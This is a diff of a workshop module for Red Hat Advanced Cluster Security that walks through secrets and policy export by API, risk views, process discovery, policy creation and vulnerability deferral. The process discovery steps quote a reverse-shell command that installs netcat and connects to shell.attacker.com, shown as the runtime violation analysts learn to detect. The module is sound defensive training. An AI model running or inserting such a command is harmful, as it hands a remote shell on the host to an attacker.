@@ -15,25 +15,56 @@ The configuration management tab contains a lot fo useful information that direc
 - Users with most cluster admin roles
 - Secrets most used across deployments
 
-image::03-cm-1.png[link=self, window=blank, width=100%]
+image::03-cm-0.png[link=self, window=blank, width=100%]
 
 Let's break down each section. 
 
 === The "Secrets most used across deployments" widget
 
-.Procedure
+*Procedure*
+
+[start=1]
 . Click the *View all* button on the "Secrets most used across deployments" widget.
 
 image::03-cm-2.png[link=self, window=blank, width=100%]
 
-In this view, you will see all of your secrets across your clusters. You can filter the secrets and export all of the information to a CSV.
+In this view, you will see all of your secrets across your clusters. You can filter the secrets and export all of the information to a CSV. However, you will not get ALL of the secrets this way. We recommend using the API to export large batches of data.
 
 [start=2]
-. Filter the secrets by *Cluster: production* & *Image Pull Secret Registry: quay.io*
+. Run the following shell command.
+
+====
+The following command uses the token and address located in the bash profile to request all of the secret information in RHACS 
+====
+
+[source,sh,subs="attributes",role=execute]
+----
+curl -k X GET "https://$ROX_CENTRAL_ADDRESS:443/v1/secrets" -H "Authorization: Bearer $ROX_API_TOKEN" -H "Content-Type: application/json" | jq
+----
+
+[.console-output]
+[source,json,subs="+macros,+attributes"]
+----
+...
+      "name": "tpa-infrastructure-kafka-user-passwords",
+      "clusterId": "86eede55-7414-4f42-809a-f978a48d8213",
+      "clusterName": "production",
+      "namespace": "trusted-profile-analyzer",
+      "types": [
+        "UNDETERMINED"
+      ],
+      "createdAt": "2024-10-01T04:00:55Z"
+    }
+  ]
+}
+----
+
+[start=3]
+. Next, filter the secrets by *Cluster: production* & *Image Pull Secret Registry: quay.io*
 
 image::03-cm-3.png[link=self, window=blank, width=100%]
 
-[start=3]
+[start=4]
 . Next, try filtering by "Secret Type."
 
 image::03-cm-4.png[link=self, window=blank, width=100%]
@@ -45,20 +76,55 @@ IMPORTANT: Not all secrets are the same, and organizations should ensure secrets
 Now, the policies entity list in the configuration management UI gives you a complete overview of all of the 
 policies in the cluster, the policy status, whether it's disabled, whether it's enabled, and whether it's enforced or not
 
-.Procedure
+*Procedure*
+
 . Click the *View all* button on the "Policy violations by severity" widget.
 
-IMPORTANT: Notice in this tab that nothing should say enforced. This is because, by default, in ACS, there is no policy that is being enforced by default. This avoids the eviction of any workloads prematurely and allows you to ingest all of this security information at the beginning of your security journey.
+IMPORTANT: Notice in this tab that nothing should say enforced. This is because, by default, in ACS, there is no policy that is being enforced. This avoids the eviction of any workloads prematurely and allows you to ingest all of this security information at the beginning of your security journey.
 
-Now, as you add policies, this page will continue to fill up. It is useful to have the ability to export all of the policies and their status.
+Now, as you add policies, this page will continue to fill up and you will require the ability to export all of the policies and their status.
 
-=== The "All entities" tab
+Let's do that using an API call again.
 
-The last section of this smaller module is  to review all of the configuration options on the right tab labeled "All Entities."
+[start=]
+. Run the following shell command.
 
-All entities contain a massive amount of suggestions such as controls users and groups, service accounts, clusters namespaces, and more so by clicking the individual tabs, you can search deeper into the security posture of your OpenShift and Kubernetes.
+====
+The following command uses the token and address located in the bash profile to request all of the Policy information and it's status in JSON. 
+====
 
-== Introduction to Risk
+
+[source,sh,subs="attributes",role=execute]
+----
+curl -k X GET "https://$ROX_CENTRAL_ADDRESS:443/v1/policies" -H "Authorization: Bearer $ROX_API_TOKEN" -H "Content-Type: application/json" | jq
+----
+
+[.console-output]
+[source,json,subs="+macros,+attributes"]
+----
+.
+    {
+      "id": "a919ccaf-6b43-4160-ac5d-a405e1440a41",
+      "name": "Fixable Severity at least Important",
+      "description": "Alert on deployments with fixable vulnerabilities with a Severity Rating at least Important",
+      "severity": "HIGH_SEVERITY",
+      "disabled": false,
+      "lifecycleStages": [
+        "BUILD",
+        "DEPLOY"
+      ],
+      "notifiers": [],
+      "lastUpdated": "2024-10-01T04:00:28.222444751Z",
+      "eventSource": "NOT_APPLICABLE",
+      "isDefault": true
+    }
+  ]
+}
+----
+
+The ability to export this policies is excellent for monitoring policies changes in a stateful way. 
+
+== Risk in RHACS
 
 You are now acquainted with the detailed information that Red Hat^(R)^ Advanced Cluster Security for Kubernetes (RHACS) provides about vulnerabilities and workflows to manage individual vulnerabilities. Often, the number of vulnerabilities detected can seem daunting to those uninitiated in security practice. You need to bring runtime, security configuration management, and vulnerability all together to get a more precise view of what is going on in your clusters. You need a system to evaluate the potential risk of harm from these vulnerabilities, and you need a way of prioritizing vulnerabilities to be addressed and not just deferring them.
 
@@ -69,8 +135,6 @@ You are now acquainted with the detailed information that Red Hat^(R)^ Advanced 
 RHACS assesses risk across your entire environment and ranks your running deployments according to their security risk. It also details vulnerabilities, configurations, and runtime activities that require immediate attention. The risk evaluation functionality of RHACS is used to understand how deployment-time configuration and runtime activity impact the likelihood of exploits occurring and how successful those exploits may be. This helps you prioritize the remedial actions you plan to take.
 
 Realistically it is only possible to tackle some sources of risk, so organizations prioritize their efforts. RHACS helps to inform that prioritization.
-
-== View Risk Justifications
 
 === View Risks by Deployment
 
@@ -95,17 +159,21 @@ image::04-risk-2.png[link=self, window=blank, width=100%]
 The *Risk Indicators* tab shows why this deployment is highly risky. The deployment has serious, fixable vulnerabilities, but it also has configurations such as network ports and service exposure outside the cluster, making it more likely to be attacked. In addition, other configurations, such as privileged containers, mean that a successful attacker has access to the underlying host network and file system, including other containers running on that host.
 
 ====
-Why do you think the deployment is rated as the *"Riskiest deployment"*
+What is the *"Riskiest deployment"*? Why do you think it was rated that way?
 ====
-
-IMPORTANT: As you scroll down think about what risk indicators are important to your organization? How would you work to mitigate that risk?
 
 [start=3]
 . Navigate to the bottom of the *Risk Indicators* page and take a minute to review the *Components Useful for Attackers* section.
 
 All of these configurations are gleaned automatically by RHACS from OpenShift, and the built-in policies assign a risk score to each, meaning that this risk report is available as soon as you start running RHACS.
 
-And, hopefully, you can see why this image is highly insecure in the service configuration section, you can see that the sysadmin capabilities are added port 8080 is exposed in the cluster, and you can see that components useful for attackers are present components such as app bash curl and wget. This means a successful attacker gains complete control over this entire OpenShift^(R)^ cluster. 
+And, hopefully, you can see why this image is highly insecure in the service configuration section. The container has;
+ - SYS_ADMIN capabilities
+ - Port 22 is exposed in an unknown manner
+ - components such as app bash curl and wget are available
+ - Apache Struts is present in the image
+ 
+This means a successful attacker can gain complete control over this entire OpenShift^(R)^ cluster. 
 
 [start=4]
 . Navigate to the deployment details
@@ -114,7 +182,7 @@ image::04-risk-3.png[link=self, window=blank, width=100%]
 
 Here we can see a complete breakdown of the deployment details including the container configuration the secrets that are mounted in the image name specific commands and the security context of the container which is *privileged*.
 
-All of this information continues to add context to the container and how it's running in the cluster bumping up its risk factors.
+The deployment details are there to help you to figure out who and what is responsible for this workload. 
 
 [start=5]
 . Next, click on the *Process Discovery* Tab
@@ -126,7 +194,14 @@ This tab shows you all of the running processes in the container. You can see th
 If you scroll to the bottomw of the page. you could add those processes to the baseline with the `+` sign and silence any future alerts. But typically we want to understand what our applications are doing before we enact any policy enfocement or exceptions.
 
 [start=6]
-. Click the drop-down arrow next to `/bin/bash` to reveal the specific context that triggered this violation: `-c /usr/bin/sudo /usr/bin/apt-get -y install netcat; /usr/bin/sudo /bin/nc shell.attacker.com 9001 -e /bin/bash`.
+. Click the drop-down arrow next to `/bin/bash` to reveal the specific context that triggered this violation
+
+image::04-risk-4.5.png[link=self, window=blank, width=100%]
+
+[start=7]
+. Review the command...
+
+`-c /usr/bin/sudo /usr/bin/apt-get -y install netcat; /usr/bin/sudo /bin/nc shell.attacker.com 9001 -e /bin/bash`.
 
 image::04-risk-5.png[link=self, window=blank, width=100%]
 
@@ -134,14 +209,14 @@ image::04-risk-5.png[link=self, window=blank, width=100%]
 Does this command running in a container at runtime seem important?
 ====
 
-[start=7]
+[start=8]
 . Click the *View Graph* in the header bar to call up the *Event Timeline*.
 
 image::04-risk-6.png[link=self, window=blank, width=100%]
 
 The event timeline shows for each pod the process activity that has occurred over time. It has the visa-processor and visa-processor-sidecar information in the interface.
 
-[start=8]
+[start=9]
 . Click the squares or circles for the process activity:
 
 image::04-risk-7.png[link=self, window=blank, width=100%]
@@ -155,7 +230,8 @@ NOTE: You can take advantage of the constrained lifecycle of containers for bett
 
 Fortunately, the `visa-processor` deployment is unlocked, and we can change our baselines. No let's take a look at what processes are explicitly allowed to run in the deployment.
 
-.Procedure
+*Procedure*
+
 . Click the *Process Discovery* tab on the *Risk Details* panel. Or click out of the *Process Discovery Graph*. 
 . Scroll down to the *Spec Container Baselines* section:
 
@@ -179,7 +255,8 @@ image::04-risk-10.png[link=self, window=blank, width=100%]
 
 In the Risk view and most UI pages, RHACS has a filter bar at the top that allows you to narrow the reporting view to matching or non-matching criteria. Almost all of the attributes that RHACS gathers are filterable. This is very useful in the Risk view when you know what you are looking for, for example, when you want answers to questions such as "What applications have `bash` present?"
 
-.Procedure
+*Procedure*
+
 . Enter `Process Name` in the filter bar (where it reads `Add one or more resource filters`) and select the *Process Name* key.
 . Enter `bash` and then press *Enter*.
 
@@ -193,17 +270,22 @@ You can create new security policies based on the filtering criteria that you se
 
 RHACS transforms the filtering criteria into policy criteria by converting the cluster, namespace, and deployment filters to equivalent policy scopes.
 
-.Procedure
-. From the Risk dashboard filter by *Process Name* THEN *apt or apt-get or dpkg* to the search bar
-. Next add  *Namespace* THEN default
+*Procedure*
 
-NOTE: What deployments did you expect to see?
+. From the Risk dashboard filter by Process Name *THEN* apt or apt-get or dpkg to the search bar
+. Next add Namespace *THEN* payments
 
+IMPORTANT: What deployments did you expect to see?
+
+image::05-policy-0.png[link=self, window=blank, width=100%]
+
+
+[start=3]
 . Click the *+ (Create Policy)* next to the filter bar 
 
 image::05-policy-1.png[link=self, window=blank, width=100%]
 
-[start=5]
+[start=4]
 . Give the policy all of the necessary information and complete the required fields then hit next.
 
 * *Name*: `No bash allowed`
@@ -222,11 +304,9 @@ image::05-policy-1.png[link=self, window=blank, width=100%]
 
 Make sure to preview the policy before accepting it. 
 
-=== Explore Advanced Filtering
+=== Advanced Filtering
 
-You can write more advanced filters focusing on particular scopes to detect vulnerabilities more accurately.
-
-Local page filtering on the *Risk* view combines the search terms by using the following methods:
+You can write more advanced filters focusing on particular scopes to detect vulnerabilities more accurately. Local page filtering on the *Risk* view combines the search terms by using the following methods:
 
 * Combines the search terms within the same category with an `OR` operator. For example, if the search query is `Cluster:A,B` the filter matches cluster `A` or cluster `B` deployments.
 
@@ -234,9 +314,17 @@ Local page filtering on the *Risk* view combines the search terms by using the f
 
 When you add multiple scopes to a policy, the policy matches violations from any of the scopes. For example, if you search for `(Cluster A OR Cluster B) AND (Namespace Z)` it results in two policy scopes, `(Cluster=A AND Namespace=Z)` OR `(Cluster=B AND Namespace=Z)`.
 
-NOTE: Not all filters can be used in policies.
+====
+*Try it yourself*
+====
 
-RHACS drops or modifies filters that do not directly map to policy criteria and reports the dropped filters.
+
+Search for the api-server deployment in the default and backend namespace.
+
+*Output*
+
+image::03-filter-00.png[link=self, window=blank, width=100%]
+
 
 See the link:https://docs.openshift.com/acs/4.4/operating/evaluate-security-risks.html[Understanding ... the filtering criteria into policy criteria^] documentation for more information.
 
@@ -247,34 +335,48 @@ See the link:https://docs.openshift.com/acs/4.4/operating/evaluate-security-risk
 
 Try some of these scopes yourself by indicating different namespaces in your filters.
 
-=== Risk Acceptance workflow 
+== Risk Acceptance workflow 
 
 As a security analyst who is a deferral approver, you can evaluate requested deferrals and respond to them through the RHACS portal. In this section we will review a deferral process in RHACS.
 
 .Procedure
-. Head to the Vulnerability Management (1.0) dashboard.
-. Click on the *quay.io/rhacs-misc/rce:1.0* image or the *riskiest image* whichever one you prefer.
-. Scroll down to *Image Findings*
+. Head to the Vulnerability Management -> Workload CVE.
 
 image::04-risk-15.png[link=self, window=blank, width=100%]
 
-[start=4]
-. Select any vulnerability that you want to defer. Click the 3 dots on the right hand side of the tab and select defer.
+[start=2]
+. Select any vulnerability that you want to defer. Click the 3 dots on the right hand side of the tab -> select defer.
 . Pick a timeline for deferral, and decide whether the vulnerability should be ignored in all images or only this one. 
-. Click "Request Approval"
+. Give the deferral a rationale 
+. Click "Submit request"
 
 image::04-risk-17.png[link=self, window=blank, width=100%]
+
+IMPORTANT: The output gives you all of the investigation information including a link that you can send out to teammates who can review your investigation. 
 
 image::04-risk-18.png[link=self, window=blank, width=100%]
 
 |====
-You should see the small blue *i* in the dashboard. Click the i and paste the link in the Address Bar
+There will be a "Pending Exception" icon in the dashboard to mark that a deferral has been requested.
 |====
 
+[start=7]
+. Click on the *Pending exception* icon
+
+You should be brought to the *Exception Management* page. Here is where you, and others, can find all of the information about the vulnerability deferral. 
+
 image::04-risk-19.png[link=self, window=blank, width=100%]
+
+
+[start=8]
+. Decide how you want to handle the deferral by click your newly created request and selecting an option. 
+
 image::04-risk-20.png[link=self, window=blank, width=100%]
 
-The Risk Acceptance bar will show all pending approvals. This will be either false positives OR deferrals. While you can mute notifications or a CVE you can never hide them in RHACS. 
+
+The Exception Management bar will show all pending vulnerability related requests.
+
+IMPORTANT: While you can mute notifications or a CVE you can never hide them in RHACS. 
 
 == What would you do?
 
